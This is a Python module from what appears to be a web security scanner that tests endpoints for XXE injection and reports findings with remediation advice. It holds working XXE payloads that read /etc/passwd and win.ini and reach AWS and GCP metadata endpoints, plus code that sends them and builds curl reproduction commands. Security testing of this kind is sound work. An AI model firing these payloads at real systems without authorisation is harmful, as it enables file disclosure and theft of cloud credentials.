"""XML External Entity (XXE) injection checks.

Targets endpoints that declare or accept XML/SVG content and standard
XML-based formats (WSDL, SOAP, RSS, Atom). Detects:
  - Classic in-band XXE via file:// read (Linux + Windows)
  - SSRF via XXE (cloud metadata endpoints)
  - Error-based XXE (file path leakage in error messages)
  - Parameter-entity XXE
"""
from __future__ import annotations
import re
import requests

from ..adaptive import Candidate
from ..findings import Finding, Severity
from ..session import session_to_curl_flags

# ── Payloads ──────────────────────────────────────────────────────────────────

# (xml_body, technique_label, response_signature_regex)
XXE_FILE_PAYLOADS: list[tuple[str, str, str]] = [
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        "LFI via file:///etc/passwd",
        r"root:.*:0:0:",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<root><data>&xxe;</data></root>',
        "Hostname disclosure via file:///etc/hostname",
        r"[a-zA-Z0-9][a-zA-Z0-9\-]{2,}",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
        '<root><data>&xxe;</data></root>',
        "Windows LFI via file:///C:/Windows/win.ini",
        r"\[fonts\]|for 16-bit app support",
    ),
]

XXE_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        '<root><data>&xxe;</data></root>',
        "SSRF → AWS instance metadata",
        r"ami-id|instance-id|security-credentials|placement/",
    ),
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>'
        '<root><data>&xxe;</data></root>',
        "SSRF → GCP metadata",
        r"computeMetadata|instance/|project/",
    ),
]

# Error-based: non-existent path — leaks absolute server path in error
XXE_ERROR_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///vectrix_xxe_probe_nonexistent_9z7k">]>'
    '<root>&xxe;</root>',
    "Error-based path disclosure",
    r"vectrix_xxe_probe|No such file|cannot open|FileNotFoundException|java\.io\.|"
    r"\/var\/www|\/home\/|\/opt\/|C:\\",
)

# Parameter entity (DOCTYPE in subset)
XXE_PARAM_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
    "Parameter entity XXE (file:///etc/passwd)",
    r"root:.*:0:0:",
)

# SOAP wrapper (common in enterprise apps)
XXE_SOAP_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
    '<soap:Body><x>&xxe;</x></soap:Body></soap:Envelope>',
    "XXE inside SOAP envelope",
    r"root:.*:0:0:",
)

ALL_PAYLOADS = (
    XXE_FILE_PAYLOADS
    + XXE_SSRF_PAYLOADS
    + [XXE_ERROR_PAYLOAD, XXE_PARAM_PAYLOAD]
)

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/atom+xml",
]


# ── Main entry ────────────────────────────────────────────────────────────────

def run(session: requests.Session, base_url: str, endpoints: list, store) -> None:
    print("[*] Checking XXE injection...")
    curl_auth = session_to_curl_flags(session)
    timeout = getattr(session, 'timeout', 15)

    tested: set[str] = set()

    for ep in endpoints:
        if ep.url in tested:
            continue

        ct = (ep.content_type or "").lower()
        url_lower = ep.url.lower()

        is_xml_candidate = (
            any(x in ct for x in ("xml", "svg", "soap", "wsdl", "rss", "atom"))
            or any(url_lower.endswith(ext) for ext in (".xml", ".svg", ".wsdl", ".asmx", ".svc"))
            or ep.method in ("POST", "PUT", "PATCH")
        )

        if not is_xml_candidate:
            continue

        tested.add(ep.url)
        if _test_xxe(session, ep, curl_auth, timeout, store):
            continue  # Stop after first confirmed XXE per endpoint

    # Also probe SOAP/XML endpoints from interesting paths
    _probe_soap_endpoints(session, base_url, curl_auth, timeout, store, tested)


# ── Core tester ───────────────────────────────────────────────────────────────

def _test_xxe(session, ep, curl_auth, timeout, store) -> bool:
    for xml_payload, technique, signature in ALL_PAYLOADS:
        for ct in XML_CONTENT_TYPES[:2]:  # application/xml first, then text/xml
            resp = _send(session, ep, xml_payload, ct, timeout)
            if resp is None:
                continue

            match = re.search(signature, resp.text, re.IGNORECASE)
            if not match:
                continue

            # Confirm: baseline with benign XML should NOT have the signature
            baseline = _send(session, ep, '<root><data>test</data></root>', ct, timeout)
            if baseline and re.search(signature, baseline.text, re.IGNORECASE):
                continue  # Signature present without XXE — false positive

            severity = (
                Severity.CRITICAL if "SSRF" in technique or "passwd" in technique.lower()
                else Severity.HIGH
            )

            curl_cmd = (
                f"curl -sk {curl_auth} -X {ep.method} "
                f"-H 'Content-Type: {ct}' "
                f"--data-binary '{xml_payload[:300]}' '{ep.url}'"
            )

            store.add(Finding(
                title=f"XXE Injection — {technique}",
                severity=severity,
                category="Injection",
                cwe="CWE-611",
                description=(
                    f"Endpoint {ep.url} обрабатывает внешние XML-сущности.\n"
                    f"Техника: {technique}\n\n"
                    "XXE позволяет:\n"
                    "• Читать произвольные файлы с сервера (LFI)\n"
                    "• Совершать SSRF-запросы от имени сервера\n"
                    "• В Java-окружениях — RCE через Expect/FTP protocol handlers\n"
                    "• DoS через Billion Laughs (entity expansion)"
                ),
                url=ep.url,
                method=ep.method,
                evidence=(
                    f"Payload вернул: ...{match.group()[:200]}...\n"
                    f"Content-Type запроса: {ct}"
                ),
                remediation=(
                    "1. Отключите DTD и внешние сущности в XML-парсере:\n"
                    "   • Java (SAX/DOM): factory.setFeature(FEATURE_SECURE_PROCESSING, true)\n"
                    "   • Python: используйте defusedxml вместо stdlib xml\n"
                    "   • PHP: libxml_set_external_entity_loader(null)\n"
                    "   • .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
                    "2. Используйте JSON вместо XML где возможно.\n"
                    "3. Валидируйте XML по строгой XSD-схеме (whitelist)."
                ),
                reproduction=curl_cmd,
            ))
            return True

    return False


def _probe_soap_endpoints(session, base_url, curl_auth, timeout, store, tested: set):
    soap_paths = [
        "/api/soap", "/soap", "/ws", "/services", "/WebService",
        "/api/xml", "/xml", "/import", "/upload", "/parse",
    ]
    for path in soap_paths:
        url = base_url.rstrip("/") + path
        if url in tested:
            continue

        from ..crawler import Endpoint  # lazy import to avoid cycle
        ep = Endpoint(url=url, method="POST", content_type="application/xml")
        tested.add(url)
        _test_xxe(session, ep, curl_auth, timeout, store)


# ── HTTP helper ───────────────────────────────────────────────────────────────

def _send(session, ep, body, content_type, timeout):
    try:
        return session.request(
            ep.method, ep.url,
            data=body.encode(),
            headers={"Content-Type": content_type},
            timeout=timeout,
        )
    except Exception:
        return None
